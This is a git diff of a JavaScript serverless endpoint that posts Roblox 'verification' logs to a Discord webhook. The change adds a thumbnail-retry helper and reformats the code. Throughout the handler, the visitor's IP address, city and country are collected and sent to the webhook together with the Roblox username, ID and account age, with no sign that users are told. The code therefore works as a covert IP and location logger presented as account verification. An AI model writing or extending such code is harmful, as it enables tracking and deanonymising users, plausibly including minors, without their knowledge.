@@ -19,6 +19,23 @@ function flag(code) {
   catch(e) { return '🌍'; }
 }
 
+async function fetchThumbnail(userId) {
+  // Try up to 3 times (Roblox thumbnail can return Pending on first call)
+  for (let i = 0; i < 3; i++) {
+    try {
+      const r = await fetch(
+        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
+      );
+      const data = await r.json();
+      const item = data?.data?.[0];
+      if (item?.state === 'Completed' && item?.imageUrl) return item.imageUrl;
+    } catch(e) {}
+    // Wait 500ms between retries
+    await new Promise(ok => setTimeout(ok, 500));
+  }
+  return null;
+}
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -29,59 +46,54 @@ export default async function handler(req, res) {
   try { body = req.body || {}; } catch(e) {}
 
   const { userId, username, days, created } = body;
-  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'N/A').split(',')[0].trim();
+  const ip      = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'N/A').split(',')[0].trim();
   const country = (req.headers['x-vercel-ip-country'] || '').toUpperCase();
-  const city = req.headers['x-vercel-ip-city'] || '';
+  const city    = req.headers['x-vercel-ip-city'] || '';
   const countryName = COUNTRY_NAMES[country] || country || 'Desconhecido';
-  const emoji = flag(country);
+  const emoji   = flag(country);
   const location = city ? `${city}, ${countryName}` : countryName;
-  const now = Math.floor(Date.now() / 1000);
-
-  // Fetch Roblox avatar thumbnail
-  let avatarUrl = null;
-  if (userId) {
-    try {
-      const thumbRes = await fetch(
-        `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`
-      );
-      const thumbData = await thumbRes.json();
-      avatarUrl = thumbData?.data?.[0]?.imageUrl || null;
-    } catch(e) {}
-  }
+  const now     = Math.floor(Date.now() / 1000);
 
   // Format creation date
-  let createdFormatted = created || 'N/A';
-  try {
-    createdFormatted = new Date(created).toLocaleDateString('pt-BR', { day:'2-digit', month:'2-digit', year:'numeric' });
-  } catch(e) {}
+  let createdFormatted = 'N/A';
+  if (created) {
+    try {
+      createdFormatted = new Date(created).toLocaleDateString('pt-BR', {
+        day: '2-digit', month: '2-digit', year: 'numeric'
+      });
+    } catch(e) { createdFormatted = String(created); }
+  }
 
-  const payload = {
-    embeds: [{
-      title: '✅  Conta Roblox Verificada',
-      color: 0x22C55E,
-      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
-      fields: [
-        { name: '👤  Username', value: `**@${username || 'N/A'}**`, inline: true },
-        { name: '🆔  User ID', value: `\`${userId || 'N/A'}\``, inline: true },
-        { name: '\u200b', value: '\u200b', inline: true },
-        { name: '📅  Data de Criação', value: createdFormatted, inline: true },
-        { name: '📆  Dias na Conta', value: `**${days || 0}** dias`, inline: true },
-        { name: '\u200b', value: '\u200b', inline: true },
-        { name: '🌍  IP', value: `\`${ip}\``, inline: true },
-        { name: `${emoji}  País`, value: location, inline: true },
-        { name: '\u200b', value: '\u200b', inline: true },
-        { name: '🕐  Verificado em', value: `<t:${now}:F>`, inline: false },
-      ],
-      footer: { text: 'Roblox Condo • Logs de Verificação' },
-      timestamp: new Date().toISOString(),
-    }],
+  // Fetch avatar (with retry for Pending state)
+  const avatarUrl = userId ? await fetchThumbnail(userId) : null;
+
+  const embed = {
+    title: '✅  Conta Roblox Verificada',
+    color: 0x22C55E,
+    fields: [
+      { name: '👤  Username',        value: `**@${username || 'N/A'}**`,    inline: true },
+      { name: '🆔  User ID',         value: `\`${userId || 'N/A'}\``,       inline: true },
+      { name: '\u200b',              value: '\u200b',                         inline: true },
+      { name: '📅  Data de Criação', value: createdFormatted,                inline: true },
+      { name: '📆  Dias na Conta',   value: `**${days || 0}** dias`,        inline: true },
+      { name: '\u200b',              value: '\u200b',                         inline: true },
+      { name: '🌍  IP',              value: `\`${ip}\``,                     inline: true },
+      { name: `${emoji}  País`,      value: location,                        inline: true },
+      { name: '\u200b',              value: '\u200b',                         inline: true },
+      { name: '🕐  Verificado em',   value: `<t:${now}:F>`,                 inline: false },
+    ],
+    footer:    { text: 'Roblox Condo • Logs de Verificação' },
+    timestamp: new Date().toISOString(),
   };
+
+  // Only set thumbnail if we got a real URL
+  if (avatarUrl) embed.thumbnail = { url: avatarUrl };
 
   try {
     await fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
+      body: JSON.stringify({ embeds: [embed] }),
     });
     return res.status(200).json({ ok: true });
   } catch(e) {
